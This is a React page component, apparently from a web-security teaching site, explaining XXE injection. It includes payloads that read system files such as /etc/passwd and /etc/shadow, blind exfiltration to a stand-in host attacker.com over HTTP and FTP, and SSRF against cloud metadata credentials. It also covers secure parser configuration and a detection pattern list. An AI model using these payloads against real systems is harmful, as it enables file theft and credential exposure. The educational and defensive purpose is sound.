
import React from 'react';
import { FileX } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const XXE: React.FC = () => {
  return (
    <section id="xxe" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">
        XML External Entity (XXE) Injection
      </h3>
      
      <div className="space-y-8">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            XML External Entity (XXE) injection is a vulnerability that occurs when XML input containing a reference to an external entity 
            is processed by a weakly configured XML parser. This attack can lead to disclosure of confidential data, denial of service, 
            server-side request forgery (SSRF), port scanning from the perspective of the machine where the parser is located, 
            and other system impacts.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Critical Impact</AlertTitle>
            <AlertDescription>
              XXE attacks can expose sensitive files, perform internal network scanning, cause denial of service, 
              and in some cases lead to remote code execution through various attack vectors.
            </AlertDescription>
          </Alert>
        </div>

        {/* How XXE Works */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How XXE Attacks Work</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
            <h5 className="font-semibold mb-2">Attack Mechanism:</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li><strong>XML Parser Processing:</strong> Application accepts XML input and processes it with an XML parser</li>
              <li><strong>External Entity Declaration:</strong> Attacker injects malicious XML containing external entity declarations</li>
              <li><strong>Entity Resolution:</strong> The XML parser attempts to resolve the external entities</li>
              <li><strong>Resource Access:</strong> Parser accesses local files, network resources, or internal services</li>
              <li><strong>Data Exfiltration:</strong> Sensitive information is returned in the XML response or error messages</li>
              <li><strong>Additional Attacks:</strong> SSRF, DoS, or other attacks are performed through entity resolution</li>
            </ol>
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="XML APIs and Web Services"
              description="SOAP services, REST APIs accepting XML, and XML-RPC endpoints that process user-supplied XML without proper validation."
              severity="high"
            />
            <SecurityCard
              title="File Upload Functionality"
              description="Applications that parse uploaded XML files, configuration files, or document formats like DOCX, XLSX that contain XML."
              severity="high"
            />
            <SecurityCard
              title="Data Import/Export Features"
              description="Systems that import XML data from external sources or allow users to upload XML configuration files."
              severity="medium"
            />
            <SecurityCard
              title="RSS/Atom Feed Processors"
              description="Applications that parse RSS feeds, Atom feeds, or other XML-based syndication formats from untrusted sources."
              severity="medium"
            />
          </div>
        </div>

        {/* Types of XXE Attacks */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of XXE Attacks</h4>
          
          {/* Classic XXE */}
          <div className="mb-6">
            <h5 className="text-lg font-semibold mb-3">1. Classic XXE (In-band)</h5>
            <p className="mb-3">
              The most straightforward XXE attack where the external entity data is returned directly in the application's response.
            </p>
            <CodeExample 
              language="xml" 
              isVulnerable={true}
              title="Classic XXE Attack Payload" 
              code={`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>password123</password>
</user>

<!-- Alternative payloads -->

<!-- Reading Windows files -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>

<!-- Reading application configuration -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>

<!-- Network scanning -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>`} 
            />
          </div>

          {/* Blind XXE */}
          <div className="mb-6">
            <h5 className="text-lg font-semibold mb-3">2. Blind XXE (Out-of-band)</h5>
            <p className="mb-3">
              When the application doesn't return the external entity data directly, attackers use out-of-band techniques 
              to exfiltrate data through DNS queries or HTTP requests to attacker-controlled servers.
            </p>
            <CodeExample 
              language="xml" 
              isVulnerable={true}
              title="Blind XXE with Data Exfiltration" 
              code={`<!-- Step 1: Trigger XXE with parameter entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>

<!-- Contents of evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
%exfiltrate;

<!-- Alternative blind XXE techniques -->

<!-- Using FTP for data exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- evil.dtd content for FTP exfiltration -->
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://attacker.com/%file;'>">
%all;`} 
            />
          </div>

          {/* Error-based XXE */}
          <div className="mb-6">
            <h5 className="text-lg font-semibold mb-3">3. Error-based XXE</h5>
            <p className="mb-3">
              Exploiting XML parser errors to leak sensitive information when the application displays detailed error messages.
            </p>
            <CodeExample 
              language="xml" 
              isVulnerable={true}
              title="Error-based XXE Exploitation" 
              code={`<!-- Trigger error with file content -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistentEntity;/%file;'>">
  %error;
]>
<data>&content;</data>

<!-- Another approach using invalid URI -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
  %eval;
  %error;
]>`} 
            />
          </div>
        </div>

        {/* Advanced XXE Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Advanced XXE Exploitation Techniques</h4>
          
          <div className="space-y-4">
            {/* SSRF via XXE */}
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Server-Side Request Forgery (SSRF) via XXE</h5>
              <CodeExample 
                language="xml" 
                title="XXE SSRF Attack" 
                code={`<!-- Internal network scanning -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>

<!-- Accessing cloud metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>

<!-- Exploiting internal services -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/users">
]>`} 
              />
            </div>

            {/* File upload XXE */}
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">XXE in File Upload Scenarios</h5>
              <CodeExample 
                language="xml" 
                title="XXE in DOCX/XLSX Files" 
                code={`<!-- Inject XXE into Office document XML files -->
<!-- In word/document.xml of a DOCX file -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>

<!-- SVG file with XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`} 
              />
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XXE Prevention Strategies</h4>
          <CodeExample 
            language="java" 
            isVulnerable={false}
            title="Secure XML Parser Configuration" 
            code={`// Java - Secure DocumentBuilderFactory configuration
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Make parser non-validating
factory.setValidating(false);
factory.setNamespaceAware(true);

// Set XInclude processing to false
factory.setXIncludeAware(false);

// Expand entity references to false
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);

// Alternative: Use SAXParserFactory
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// For XMLReader
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);`} 
          />

          <CodeExample 
            language="python" 
            isVulnerable={false}
            title="Python - Secure XML Processing" 
            code={`# Python - Using defusedxml library (recommended)
from defusedxml import ElementTree as ET
from defusedxml.ElementTree import parse

# Secure parsing with defusedxml
tree = ET.parse('input.xml')
root = tree.getroot()

# Alternative: Configure standard library securely
import xml.etree.ElementTree as ET
from xml.parsers.expat import ParserCreateNS

# Disable external entity processing
def secure_parse_xml(xml_string):
    parser = ParserCreateNS()
    
    # Disable external entity processing
    parser.DefaultHandler = lambda data: None
    parser.ExternalEntityRefHandler = None
    
    # Parse safely
    parser.Parse(xml_string, True)

# Using lxml securely
from lxml import etree

# Create parser with security restrictions
parser = etree.XMLParser(
    resolve_entities=False,  # Disable entity resolution
    strip_cdata=False,
    recover=False,
    remove_blank_text=False,
    huge_tree=False,
    collect_ids=False
)

# Parse with secure parser
tree = etree.parse('input.xml', parser)

# Input validation approach
import re

def validate_xml_input(xml_content):
    # Check for suspicious patterns
    dangerous_patterns = [
        r'<!ENTITY',
        r'SYSTEM\s+["\']',
        r'file://',
        r'http://',
        r'https://',
        r'ftp://'
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, xml_content, re.IGNORECASE):
            raise ValueError("Potentially malicious XML content detected")
    
    return xml_content`} 
          />
        </div>

        {/* Testing for XXE */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Testing for XXE Vulnerabilities</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <h5 className="font-semibold mb-2">Manual Testing Approach:</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li>Identify all XML input points in the application</li>
              <li>Test with basic XXE payloads to read local files</li>
              <li>Try blind XXE techniques if direct responses don't work</li>
              <li>Test file upload functionality with malicious XML files</li>
              <li>Check for SSRF possibilities through XXE</li>
              <li>Test error-based information disclosure</li>
            </ol>
            
            <h5 className="font-semibold mb-2 mt-4">Automated Testing Tools:</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>Burp Suite Professional:</strong> Built-in XXE detection and exploitation</li>
              <li><strong>OWASP ZAP:</strong> Active and passive XXE vulnerability scanning</li>
              <li><strong>XXEinjector:</strong> Specialized tool for XXE exploitation</li>
              <li><strong>Nuclei:</strong> Template-based XXE detection</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};

export default XXE;
